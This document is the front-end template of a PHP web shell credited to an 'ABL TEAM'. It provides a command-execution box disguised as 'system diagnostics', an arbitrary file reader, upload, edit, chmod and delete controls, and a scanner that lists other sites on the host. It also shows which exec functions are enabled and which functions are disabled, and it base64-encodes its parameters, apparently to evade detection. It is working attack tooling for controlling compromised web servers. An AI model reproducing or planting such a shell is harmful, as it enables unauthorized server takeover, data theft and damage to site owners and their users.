                    <a href="?d=<?php echo e($drive); ?>"><?php echo strtoupper($drive); ?></a>
                <?php endforeach; ?>
            </div>
        </div>
        
        <div class="server-info">
            <div class="server-info-item">
                <strong>🖥️ OS:</strong>
                <span><?php echo $serverOS; ?></span>
            </div>
            <div class="server-info-item">
                <strong>🌐 Server:</strong>
                <span><?php echo $serverSoftware; ?></span>
            </div>
            <div class="server-info-item">
                <strong>🐘 PHP:</strong>
                <span><?php echo $phpVersion; ?></span>
            </div>
            <div class="server-info-item">
                <strong>👤 User:</strong>
                <span><?php echo $currentUser; ?></span>
            </div>
            <div class="server-info-item">
                <strong>📡 Server IP:</strong>
                <span><?php echo $serverIP; ?></span>
            </div>
            <div class="server-info-item">
                <strong>🔗 Your IP:</strong>
                <span><?php echo $clientIP; ?></span>
            </div>
            <div class="server-info-item" style="grid-column: 1 / -1;">
                <strong>💾 Disk:</strong>
                <span><?php echo formatSize($diskUsed); ?> / <?php echo formatSize($diskTotal); ?> (<?php echo $diskUsedPercent; ?>% used)</span>
                <div class="disk-usage" style="flex: 1; margin-left: 10px;">
                    <div class="disk-usage-bar" style="width: <?php echo $diskUsedPercent; ?>%;"></div>
                </div>
            </div>
        </div>
        
        <div class="terminal-section">
            <form method="post" class="terminal-input">
                <input type="text" name="cmd" placeholder="$ Run system diagnostics or commands..." value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>" autofocus>
                <button type="submit" class="btn">Execute</button>
            </form>
            <?php if ($diagnosticResult !== ''): ?>
            <div class="terminal-output"><?php echo htmlspecialchars($diagnosticResult); ?></div>
            <?php endif; ?>
        </div>
        
        <div class="toolbar">
            <div class="toolbar-top">
                <button class="btn" onclick="showModal('newfileModal')">+ New File</button>
                <button class="btn" onclick="showModal('newfolderModal')">+ New Folder</button>
                <button class="btn" onclick="showModal('uploadModal')">Upload</button>
                <button class="btn-secondary btn" style="float:right;" onclick="window.location.reload()">Refresh</button>
            </div>
            
            <div class="goto-container">
                <button class="btn-danger btn" onclick="deleteSelected()">Delete Selected</button>
                <span class="info-text">Go to:</span>
                <input type="text" id="gotoInput" value="<?php echo htmlspecialchars($dir); ?>" placeholder="Enter directory path...">
                <button class="btn-warning btn" onclick="goToPath()">Go</button>
                <span class="info-text" style="margin-left: 20px;">Read file:</span>
                <input type="text" id="readInput" placeholder="Enter file path...">
                <button class="btn-warning btn" onclick="readFile()">Read</button>
            </div>
        </div>
        
        <div class="toolbar-bottom">
            <div class="show-entries">
                <span class="info-text">Show</span>
                <select onchange="changePerPage(this.value)">
                    <option value="10" <?php echo $perPage == 10 ? 'selected' : ''; ?>>10</option>
                    <option value="25" <?php echo $perPage == 25 ? 'selected' : ''; ?>>25</option>
                    <option value="50" <?php echo $perPage == 50 ? 'selected' : ''; ?>>50</option>
                    <option value="100" <?php echo $perPage == 100 ? 'selected' : ''; ?>>100</option>
                </select>
                <span class="info-text">entries</span>
            </div>
            
            <div class="search-box">
                <span class="info-text">Search:</span>
                <input type="text" id="searchBox" onkeyup="searchFiles()" placeholder="Type to search...">
            </div>
            
            <div class="pagination">
                <?php if ($currentPage > 1): ?>
                    <a href="?d=<?php echo e($dir); ?>&p=<?php echo $currentPage - 1; ?>&pp=<?php echo $perPage; ?>">Previous</a>
                <?php else: ?>
                    <span style="color:#ccc;">Previous</span>
                <?php endif; ?>
                
                <span class="current"><?php echo $currentPage; ?></span>
                
                <?php if ($currentPage < $totalPages): ?>
                    <a href="?d=<?php echo e($dir); ?>&p=<?php echo $currentPage + 1; ?>&pp=<?php echo $perPage; ?>">Next</a>
                <?php else: ?>
                    <span style="color:#ccc;">Next</span>
                <?php endif; ?>
            </div>
        </div>
        
        <table id="fileTable">
            <thead>
                <tr>
                    <th style="width: 35px; text-align: center;">
                        <input type="checkbox" onclick="toggleAll(this)">
                    </th>
                    <th style="width: 50%;">Name</th>
                    <th style="width: 9%;">Owner</th>
                    <th style="width: 9%;">Permissions</th>
                    <th style="width: 27%; text-align: right;">Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php if (dirname($dir) != $dir): ?>
                <tr style="background: #0d1117;">
                    <td style="text-align: center;">📁</td>
                    <td colspan="4">
                        <a href="?d=<?php echo e(dirname($dir)); ?>&pp=<?php echo $perPage; ?>" class="parent-dir-link">
                            ⬆️ Parent Directory
                        </a>
                    </td>
                </tr>
                <?php endif; ?>
                
                <?php foreach ($contents as $item): ?>
                <tr>
                    <td style="text-align: center;">
                        <input type="checkbox" class="file-check" value="<?php echo htmlspecialchars($item['name']); ?>">
                    </td>
                    <td>
                        <?php 
                        $isRestricted = $item['is_restricted'] || !$item['is_mine'];
                        $restrictedClass = $isRestricted ? 'file-restricted' : '';
                        ?>
                        <?php if ($item['is_dir']): ?>
                            <span class="folder-icon"></span>
                            <a href="?d=<?php echo e($item['path']); ?>&pp=<?php echo $perPage; ?>" style="font-weight: 500;" class="<?php echo $restrictedClass; ?>">
                                <?php echo htmlspecialchars($item['name']); ?>
                            </a>
                        <?php else: ?>
                            <span class="file-icon"></span>
                            <span class="<?php echo $restrictedClass; ?>"><?php echo htmlspecialchars($item['name']); ?></span>
                        <?php endif; ?>
                    </td>
                    <td>
                        <span class="file-info <?php echo $isRestricted ? 'restricted' : ''; ?>">
                            <span class="owner"><?php echo htmlspecialchars($item['owner']); ?></span>
                        </span>
                    </td>
                    <td>
                        <span class="file-info <?php echo $isRestricted ? 'restricted' : ''; ?>">
                            <span class="perms"><?php echo $item['perms']; ?></span>
                        </span>
                    </td>
                    <td class="action-links" style="text-align: right; white-space: nowrap;">
                        <?php if (!$item['is_dir']): ?>
                            <a href="#" onclick="editFile('<?php echo htmlspecialchars($item['name'], ENT_QUOTES); ?>'); return false;">Edit</a>
                            <a href="?a=<?php echo e('download'); ?>&d=<?php echo e($dir); ?>&f=<?php echo e($item['name']); ?>">Download</a>
                            <a href="#" onclick="openFileUrl('<?php echo htmlspecialchars($item['name'], ENT_QUOTES); ?>'); return false;" title="Open as URL">🔗</a>
                        <?php endif; ?>
                        <a href="#" onclick="chmodItem('<?php echo htmlspecialchars($item['name'], ENT_QUOTES); ?>', '<?php echo $item['perms']; ?>'); return false;">Chmod</a>
                        <a href="#" onclick="renameItem('<?php echo htmlspecialchars($item['name'], ENT_QUOTES); ?>'); return false;">Rename</a>
                        <a href="#" onclick="if(confirm('Delete <?php echo htmlspecialchars($item['name'], ENT_QUOTES); ?>?')) { window.location.href='?a=<?php echo e('delete'); ?>&d=<?php echo e($dir); ?>&f=<?php echo e($item['name']); ?>&pp=<?php echo $perPage; ?>'; } return false;" style="border-color: #e74c3c; color: #e74c3c;">Delete</a>
                    </td>
                </tr>
                <?php endforeach; ?>
                
                <?php if (empty($contents)): ?>
                <tr>
                    <td colspan="5" style="text-align: center; color: #8b949e; padding: 30px;">Directory is empty</td>
                </tr>
                <?php endif; ?>
            </tbody>
        </table>
        
        <div class="toolbar-bottom">
            <div class="info-text">
                Showing <?php echo (($currentPage - 1) * $perPage) + 1; ?> to <?php echo min($currentPage * $perPage, $totalEntries); ?> of <?php echo $totalEntries; ?> entries
            </div>
            
            <div class="pagination">
                <?php if ($currentPage > 1): ?>
                    <a href="?d=<?php echo e($dir); ?>&p=<?php echo $currentPage - 1; ?>&pp=<?php echo $perPage; ?>">Previous</a>
                <?php else: ?>
                    <span style="color:#ccc;">Previous</span>
                <?php endif; ?>
                
                <span class="current"><?php echo $currentPage; ?></span>
                
                <?php if ($currentPage < $totalPages): ?>
                    <a href="?d=<?php echo e($dir); ?>&p=<?php echo $currentPage + 1; ?>&pp=<?php echo $perPage; ?>">Next</a>
                <?php else: ?>
                    <span style="color:#ccc;">Next</span>
                <?php endif; ?>
            </div>
        </div>
        
        <div class="credits-section">
            <p><strong>ASEP RAJA JALANAN</strong> X ABL TEAM | Loaded in <?php echo round(microtime(true) - $startTime, 3); ?>s | <?php echo date('Y-m-d H:i:s'); ?></p>
        </div>
    </div>
    
    <!-- New File Modal -->
    <div id="newfileModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('newfileModal')">&times;</span>
            <h2>Create New File</h2>
            <form method="post" action="?a=<?php echo e('newfile'); ?>&d=<?php echo e($dir); ?>&pp=<?php echo $perPage; ?>">
                <input type="text" name="filename" placeholder="Enter filename (e.g., file.txt)" required style="width: 100%; margin: 10px 0;">
                <button type="submit" class="btn">Create File</button>
            </form>
        </div>
    </div>
    
    <!-- New Folder Modal -->
    <div id="newfolderModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('newfolderModal')">&times;</span>
            <h2>Create New Directory</h2>
            <form method="post" action="?a=<?php echo e('newfolder'); ?>&d=<?php echo e($dir); ?>&pp=<?php echo $perPage; ?>">
                <input type="text" name="foldername" placeholder="Enter folder name" required style="width: 100%; margin: 10px 0;">
                <button type="submit" class="btn">Create Directory</button>
            </form>
        </div>
    </div>
    
    <!-- Upload Modal -->
    <div id="uploadModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('uploadModal')">&times;</span>
            <h2>Upload Files</h2>
            <form method="post" action="?a=<?php echo e('upload'); ?>&d=<?php echo e($dir); ?>&pp=<?php echo $perPage; ?>" enctype="multipart/form-data">
                <input type="file" name="files[]" multiple required style="width: 100%; margin: 10px 0; padding: 10px;">
                <div style="color: #8b949e; font-size: 12px; margin: 10px 0;">
                    <p>💡 You can select multiple files to upload at once</p>
                </div>
                <button type="submit" class="btn">Upload Files</button>
            </form>
        </div>
    </div>
    
    <!-- Edit File Modal -->
    <div id="editModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('editModal')">&times;</span>
            <h2>Edit File: <span id="editFileName"></span></h2>
            <form method="post" action="?a=<?php echo e('edit'); ?>&d=<?php echo e($dir); ?>&pp=<?php echo $perPage; ?>">
                <input type="hidden" name="file" id="editFileInput">
                <textarea name="content" id="editFileContent" placeholder="File content..."></textarea>
                <div style="margin-top: 10px;">
                    <button type="submit" class="btn">Save Changes</button>
                    <button type="button" class="btn-secondary btn" onclick="closeModal('editModal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <!-- Rename Modal -->
    <div id="renameModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('renameModal')">&times;</span>
            <h2>Rename File/Folder</h2>
            <form method="post" action="?a=<?php echo e('rename'); ?>&d=<?php echo e($dir); ?>&pp=<?php echo $perPage; ?>">
                <input type="hidden" name="oldname" id="renameOldName">
                <label style="color:#7f8c8d; display: block; margin-bottom: 5px;">New name:</label>
                <input type="text" name="newname" id="renameNewName" placeholder="Enter new name" 
                       required style="width: 100%; margin: 10px 0;">
                <button type="submit" class="btn">Rename</button>
            </form>
        </div>
    </div>
    
    <!-- Chmod Modal -->
    <div id="chmodModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('chmodModal')">&times;</span>
            <h2>Change Permissions (chmod)</h2>
            <form method="post" action="?a=<?php echo e('chmod'); ?>&d=<?php echo e($dir); ?>&pp=<?php echo $perPage; ?>">
                <input type="hidden" name="file" id="chmodFileName">
                <label style="color:#7f8c8d; display: block; margin-bottom: 5px;">File: <strong id="chmodFileDisplay"></strong></label>
                <label style="color:#7f8c8d; display: block; margin-bottom: 5px; margin-top: 15px;">Permissions (e.g., 0644, 0755):</label>
                <input type="text" name="perms" id="chmodPerms" placeholder="0644" 
                       pattern="[0-7]{4}" required style="width: 100%; margin: 10px 0;">
                <div style="color:#7f8c8d; font-size: 12px; margin: 10px 0;">
                    <p><strong>Common permissions:</strong></p>
                    <p>0644 - Files (rw-r--r--)</p>
                    <p>0755 - Directories/Executables (rwxr-xr-x)</p>
                    <p>0777 - Full access (rwxrwxrwx)</p>
                </div>
                <button type="submit" class="btn">Change Permission</button>
            </form>
        </div>
    </div>
    
    <!-- Read File Modal -->
    <div id="readModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('readModal')">&times;</span>
            <h2>Read File: <span id="readFileName"></span></h2>
            <textarea id="readFileContent" readonly></textarea>
            <div style="margin-top: 10px;">
                <button type="button" class="btn-secondary btn" onclick="closeModal('readModal')">Close</button>
            </div>
        </div>
    </div>
    
    <!-- Domain Scanner Modal -->
    <div id="domainModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('domainModal')">&times;</span>
            <h2>🌐 Domain Scanner</h2>
            <div class="info-modal-content">
                <?php
                function scanDomains() {
                    $domains = array();
                    $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
                    
                    // Scan document root for directories
                    if ($docRoot && is_dir($docRoot)) {
                        $items = @scandir($docRoot);
                        if ($items) {
                            foreach ($items as $item) {
                                if ($item == '.' || $item == '..') continue;
                                $path = $docRoot . DIRECTORY_SEPARATOR . $item;
                                if (is_dir($path)) {
                                    // Check if contains index files
                                    $hasIndex = file_exists($path . DIRECTORY_SEPARATOR . 'index.php') ||
                                               file_exists($path . DIRECTORY_SEPARATOR . 'index.html') ||
                                               file_exists($path . DIRECTORY_SEPARATOR . 'index.htm');
                                    
                                    $domains[] = array(
                                        'name' => $item,
                                        'path' => $path,
                                        'has_index' => $hasIndex,
                                        'url' => $item
                                    );
                                }
                            }
                        }
                    }
                    
                    // Try to detect from common web server directories
                    $commonPaths = array(
                        'C:/xampp/htdocs',
                        'C:/wamp/www',
                        'C:/wamp64/www',
                        '/var/www',
                        '/var/www/html',
                        '/usr/share/nginx/html',
                        '/home',
                    );
                    
                    foreach ($commonPaths as $commonPath) {
                        if (is_dir($commonPath) && $commonPath != $docRoot) {
                            $items = @scandir($commonPath);
                            if ($items) {
                                foreach ($items as $item) {
                                    if ($item == '.' || $item == '..') continue;
                                    $path = $commonPath . '/' . $item;
                                    if (is_dir($path)) {
                                        $hasIndex = file_exists($path . '/index.php') ||
                                                   file_exists($path . '/index.html') ||
                                                   file_exists($path . '/index.htm');
                                        
                                        // Check if already added
                                        $exists = false;
                                        foreach ($domains as $d) {
                                            if ($d['name'] == $item) {
                                                $exists = true;
                                                break;
                                            }
                                        }
                                        
                                        if (!$exists) {
                                            $domains[] = array(
                                                'name' => $item,
                                                'path' => $path,
                                                'has_index' => $hasIndex,
                                                'url' => $item
                                            );
                                        }
                                    }
                                }
                            }
                        }
                    }
                    
                    return $domains;
                }
                
                $detectedDomains = scanDomains();
                ?>
                
                <div class="info-section">
                    <h3>📊 Detection Summary</h3>
                    <div class="info-item">
                        <span class="info-label">Total Directories Found:</span>
                        <span class="info-value status-enabled"><?php echo count($detectedDomains); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Document Root:</span>
                        <span class="info-value"><?php echo htmlspecialchars($_SERVER['DOCUMENT_ROOT'] ?? 'Unknown'); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Current Domain:</span>
                        <span class="info-value"><?php echo htmlspecialchars($domain); ?></span>
                    </div>
                </div>
                
                <div class="info-section">
                    <h3>🌍 Detected Domains / Directories</h3>
                    <?php if (empty($detectedDomains)): ?>
                        <div class="info-item">
                            <span class="info-value status-disabled">No domains detected</span>
                        </div>
                    <?php else: ?>
                        <div style="max-height: 400px; overflow-y: auto;">
                            <table style="width: 100%; border-collapse: collapse; margin-top: 10px;">
                                <thead>
                                    <tr style="background: rgba(88,166,255,0.1); border-bottom: 2px solid #21262d;">
                                        <th style="padding: 10px; text-align: left; color: #58a6ff;">Name</th>
                                        <th style="padding: 10px; text-align: center; color: #58a6ff;">Status</th>
                                        <th style="padding: 10px; text-align: center; color: #58a6ff;">Actions</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php foreach ($detectedDomains as $dom): ?>
                                        <tr style="border-bottom: 1px solid #161a20;">
                                            <td style="padding: 10px;">
                                                <strong style="color: #e6edf3;"><?php echo htmlspecialchars($dom['name']); ?></strong><br>
                                                <small style="color: #7d8590; font-family: monospace;"><?php echo htmlspecialchars($dom['path']); ?></small>
                                            </td>
                                            <td style="padding: 10px; text-align: center;">
                                                <?php if ($dom['has_index']): ?>
                                                    <span class="status-enabled">✅ Active</span>
                                                <?php else: ?>
                                                    <span class="status-disabled">⚠️ No Index</span>
                                                <?php endif; ?>
                                            </td>
                                            <td style="padding: 10px; text-align: center;">
                                                <a href="<?php echo $protocol . $domain . '/' . $dom['url']; ?>" target="_blank" 
                                                   style="color: #58a6ff; text-decoration: underline;">
                                                    🔗 Open
                                                </a>
                                                <span style="margin: 0 5px; color: #7d8590;">|</span>
                                                <a href="?d=<?php echo e($dom['path']); ?>" 
                                                   style="color: #58a6ff; text-decoration: underline;">
                                                    📁 Browse
                                                </a>
                                            </td>
                                        </tr>
                                    <?php endforeach; ?>
                                </tbody>
                            </table>
                        </div>
                    <?php endif; ?>
                </div>
                
                <div class="info-section">
                    <h3>💡 Tips</h3>
                    <div style="color: #7d8590; font-size: 12px; line-height: 1.6;">
                        <p>• <strong>Active</strong> = Directory contains index file (index.php/html)</p>
                        <p>• <strong>No Index</strong> = Directory exists but no index file found</p>
                        <p>• Click <strong>🔗 Open</strong> to visit the domain in browser</p>
                        <p>• Click <strong>📁 Browse</strong> to navigate to directory in file manager</p>
                    </div>
                </div>
            </div>
            <div style="margin-top: 15px;">
                <button type="button" class="btn-secondary btn" onclick="closeModal('domainModal')">Close</button>
                <button type="button" class="btn" onclick="location.reload()">🔄 Refresh Scan</button>
            </div>
        </div>
    </div>
    
    <!-- Info Modal -->
    <div id="infoModal" class="modal">
        <div class="modal-content">
            <span class="close" onclick="closeModal('infoModal')">&times;</span>
            <h2>🔍 System Information</h2>
            <div class="info-modal-content">
                <div class="info-section">
                    <h3>📋 Server Information</h3>
                    <div class="info-item">
                        <span class="info-label">Operating System:</span>
                        <span class="info-value"><?php echo php_uname('s') . ' ' . php_uname('r'); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Server Software:</span>
                        <span class="info-value"><?php echo $serverSoftware; ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">PHP Version:</span>
                        <span class="info-value"><?php echo phpversion(); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Server Name:</span>
                        <span class="info-value"><?php echo $serverName; ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Current User:</span>
                        <span class="info-value"><?php echo $currentUser; ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Document Root:</span>
                        <span class="info-value"><?php echo $_SERVER['DOCUMENT_ROOT'] ?? 'N/A'; ?></span>
                    </div>
                </div>
                
                <div class="info-section">
                    <h3>⚙️ PHP Configuration</h3>
                    <div class="info-item">
                        <span class="info-label">Safe Mode:</span>
                        <span class="info-value <?php echo ini_get('safe_mode') ? 'status-enabled' : 'status-disabled'; ?>">
                            <?php echo ini_get('safe_mode') ? 'Enabled' : 'Disabled'; ?>
                        </span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Open Basedir:</span>
                        <span class="info-value"><?php echo ini_get('open_basedir') ?: 'None'; ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Memory Limit:</span>
                        <span class="info-value"><?php echo ini_get('memory_limit'); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Max Execution Time:</span>
                        <span class="info-value"><?php echo ini_get('max_execution_time'); ?>s</span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Upload Max Filesize:</span>
                        <span class="info-value"><?php echo ini_get('upload_max_filesize'); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Post Max Size:</span>
                        <span class="info-value"><?php echo ini_get('post_max_size'); ?></span>
                    </div>
                </div>
                
                <div class="info-section">
                    <h3>🔧 Exec Functions Status</h3>
                    <div class="info-item">
                        <span class="info-label">exec():</span>
                        <span class="info-value <?php echo function_exists('exec') ? 'status-enabled' : 'status-disabled'; ?>">
                            <?php echo function_exists('exec') ? '✅ Enabled' : '❌ Disabled'; ?>
                        </span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">shell_exec():</span>
                        <span class="info-value <?php echo function_exists('shell_exec') ? 'status-enabled' : 'status-disabled'; ?>">
                            <?php echo function_exists('shell_exec') ? '✅ Enabled' : '❌ Disabled'; ?>
                        </span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">system():</span>
                        <span class="info-value <?php echo function_exists('system') ? 'status-enabled' : 'status-disabled'; ?>">
                            <?php echo function_exists('system') ? '✅ Enabled' : '❌ Disabled'; ?>
                        </span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">passthru():</span>
                        <span class="info-value <?php echo function_exists('passthru') ? 'status-enabled' : 'status-disabled'; ?>">
                            <?php echo function_exists('passthru') ? '✅ Enabled' : '❌ Disabled'; ?>
                        </span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">proc_open():</span>
                        <span class="info-value <?php echo function_exists('proc_open') ? 'status-enabled' : 'status-disabled'; ?>">
                            <?php echo function_exists('proc_open') ? '✅ Enabled' : '❌ Disabled'; ?>
                        </span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">popen():</span>
                        <span class="info-value <?php echo function_exists('popen') ? 'status-enabled' : 'status-disabled'; ?>">
                            <?php echo function_exists('popen') ? '✅ Enabled' : '❌ Disabled'; ?>
                        </span>
                    </div>
                </div>
                
                <div class="info-section">
                    <h3>🛡️ Disabled Functions</h3>
                    <div class="info-item">
                        <span class="info-label">Disabled Functions:</span>
                        <span class="info-value status-disabled">
                            <?php 
                            $disabled = ini_get('disable_functions');
                            echo $disabled ? $disabled : 'None';
                            ?>
                        </span>
                    </div>
                </div>
                
                <div class="info-section">
                    <h3>💾 Disk Information</h3>
                    <div class="info-item">
                        <span class="info-label">Total Space:</span>
                        <span class="info-value"><?php echo formatSize($diskTotal); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Free Space:</span>
                        <span class="info-value"><?php echo formatSize($diskFree); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Used Space:</span>
                        <span class="info-value"><?php echo formatSize($diskUsed); ?> (<?php echo $diskUsedPercent; ?>%)</span>
                    </div>
                </div>
                
                <div class="info-section">
                    <h3>🌐 Network Information</h3>
                    <div class="info-item">
                        <span class="info-label">Server IP:</span>
                        <span class="info-value"><?php echo $serverIP; ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Your IP:</span>
                        <span class="info-value"><?php echo $clientIP; ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Server Port:</span>
                        <span class="info-value"><?php echo $_SERVER['SERVER_PORT'] ?? 'N/A'; ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Protocol:</span>
                        <span class="info-value"><?php echo $_SERVER['SERVER_PROTOCOL'] ?? 'N/A'; ?></span>
                    </div>
                </div>
            </div>
            <div style="margin-top: 15px;">
                <button type="button" class="btn-secondary btn" onclick="closeModal('infoModal')">Close</button>
            </div>
        </div>
    </div>
    
    <script>
        // Encode/decode functions matching PHP
        function e(str) {
            return btoa(unescape(encodeURIComponent(str)));
        }
        
        function d(str) {
            return decodeURIComponent(escape(atob(str)));
        }
        
        function showModal(id) {
            document.getElementById(id).style.display = 'block';
        }
        
        function closeModal(id) {
            document.getElementById(id).style.display = 'none';
        }
        
        window.onclick = function(event) {
            if (event.target.classList.contains('modal')) {
                event.target.style.display = 'none';
            }
        }
        
        function editFile(filename) {
            fetch('?gf=' + e(filename) + '&d=<?php echo e($dir); ?>')
                .then(response => response.text())
                .then(data => {
                    document.getElementById('editFileName').textContent = filename;
                    document.getElementById('editFileInput').value = filename;
                    document.getElementById('editFileContent').value = data;
                    showModal('editModal');
                })
                .catch(error => {
                    alert('Error loading file: ' + error);
                });
        }
        
        function readFile() {
            var path = document.getElementById('readInput').value;
            if (!path) {
                alert('Please enter a file path');
                return;
            }
            
            fetch('?gf=' + e(path) + '&d=<?php echo e($dir); ?>')
                .then(response => response.text())
                .then(data => {
                    document.getElementById('readFileName').textContent = path;
                    document.getElementById('readFileContent').value = data;
                    showModal('readModal');
                })
                .catch(error => {
                    alert('Error reading file: ' + error);
                });
        }
        
        function renameItem(oldname) {
            document.getElementById('renameOldName').value = oldname;
            document.getElementById('renameNewName').value = oldname;
            showModal('renameModal');
        }
        
        function chmodItem(filename, currentPerms) {
            document.getElementById('chmodFileName').value = filename;
            document.getElementById('chmodFileDisplay').textContent = filename;
            document.getElementById('chmodPerms').value = currentPerms;
            showModal('chmodModal');
        }
        
        function toggleAll(source) {
            var checkboxes = document.querySelectorAll('.file-check');
            for (var i = 0; i < checkboxes.length; i++) {
                checkboxes[i].checked = source.checked;
            }
        }
        
        function deleteSelected() {
            var checkboxes = document.querySelectorAll('.file-check:checked');
            if (checkboxes.length === 0) {
                alert('Please select files to delete');
                return;
            }
            
            if (!confirm('Delete ' + checkboxes.length + ' selected item(s)?')) {
                return;
            }
            
            var files = [];
            checkboxes.forEach(function(cb) {
                files.push(cb.value);
            });
            
            // Delete files one by one
            var deleteNext = function(index) {
                if (index >= files.length) {
                    window.location.href = '?d=<?php echo e($dir); ?>&pp=<?php echo $perPage; ?>';
                    return;
                }
                fetch('?a=' + e('delete') + '&d=<?php echo e($dir); ?>&f=' + e(files[index]) + '&pp=<?php echo $perPage; ?>')
                    .then(() => deleteNext(index + 1))
                    .catch(() => deleteNext(index + 1));
            };
            deleteNext(0);
        }
        
        function searchFiles() {
            var input = document.getElementById('searchBox');
            var filter = input.value.toUpperCase();
            var table = document.getElementById('fileTable');
            var tr = table.getElementsByTagName('tr');
            
            for (var i = 1; i < tr.length; i++) {
                var td = tr[i].getElementsByTagName('td')[1];
                if (td) {
                    var txtValue = td.textContent || td.innerText;
                    if (txtValue.toUpperCase().indexOf(filter) > -1) {
                        tr[i].style.display = '';
                    } else {
                        tr[i].style.display = 'none';
                    }
                }
            }
        }
        
        function changePerPage(value) {
            window.location.href = '?d=<?php echo e($dir); ?>&pp=' + value + '&p=1';
        }
        
        function goToPath() {
            var path = document.getElementById('gotoInput').value;
            if (path) {
                window.location.href = '?d=' + e(path) + '&pp=<?php echo $perPage; ?>';
            }
        }
        
        function goToDropdown(select) {
            var path = select.value;
            if (path) {
                window.location.href = '?d=' + e(path) + '&pp=<?php echo $perPage; ?>';
                select.selectedIndex = 0;
            }
        }
        
        function openFileUrl(filename) {
            var domain = '<?php echo $fullDomain; ?>';
            var currentDir = '<?php echo str_replace("\\", "/", addslashes($dir)); ?>';
            var docRoot = '<?php echo str_replace("\\", "/", addslashes($_SERVER['DOCUMENT_ROOT'] ?? '')); ?>';
            
            // Normalize double slashes to single
            currentDir = currentDir.replace(/\/+/g, '/');
            docRoot = docRoot.replace(/\/+/g, '/');
            
            // Remove trailing slashes
            currentDir = currentDir.replace(/\/$/, '');
            docRoot = docRoot.replace(/\/$/, '');
            
            // Convert to lowercase for case-insensitive comparison (Windows)
            var currentDirLower = currentDir.toLowerCase();
            var docRootLower = docRoot.toLowerCase();
            
            var url = '';
            
            if (docRoot && currentDirLower.indexOf(docRootLower) === 0) {
                // File is under document root
                var webPath = currentDir.substring(docRoot.length);
                // Ensure starts with /
                if (webPath && !webPath.startsWith('/')) {
                    webPath = '/' + webPath;
                }
                url = domain + webPath + '/' + filename;
            } else {
                // Fallback
                url = domain + '/' + filename;
            }
            
            console.log('Current Dir:', currentDir);
            console.log('Doc Root:', docRoot);
            console.log('Web Path:', currentDir.substring(docRoot.length));
            console.log('Opening URL:', url);
            window.open(url, '_blank');
        }
        
        // Handle enter key in goto input
        document.addEventListener('DOMContentLoaded', function() {
            var gotoInput = document.getElementById('gotoInput');
            if (gotoInput) {
                gotoInput.addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        goToPath();
                    }
                });
            }
            
            var readInput = document.getElementById('readInput');
            if (readInput) {
                readInput.addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        readFile();
                    }
                });
            }
        });
    </script>
</body>
</html>
